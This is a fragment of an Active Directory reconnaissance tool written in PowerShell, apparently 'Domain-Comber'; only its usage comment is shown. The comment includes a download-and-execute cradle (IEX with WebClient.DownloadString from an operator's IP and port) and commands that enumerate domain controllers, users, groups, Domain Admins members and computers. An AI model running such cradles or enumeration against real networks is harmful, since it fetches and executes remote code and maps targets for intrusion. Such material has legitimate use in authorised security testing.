function Domain-Comber {
    ...
    TO USE:
    You can Open PowerShell and type > Import-Module .\Domain-Comber.ps1
    Or 
    Download it via a PowerShell Cradle > IEX (New-Object System.Net.Webclient).DownloadString('http://<Your-IP>:<Your-Port>/Domain-Comber.ps1')

    EXAMPLE COMMANDS:
    Domain-Comber -GetFromDomain dc
    Domain-Comber -GetFromDomain users
    Domain-Comber -GetFromDomain userinfo -UserName "domainuser"
    Domain-Comber -GetFromDomain groups
    Domain-Comber -GetFromDomain members -GroupName "Domain Admins"                      
    Domain-Comber -GetFromDomain Computers
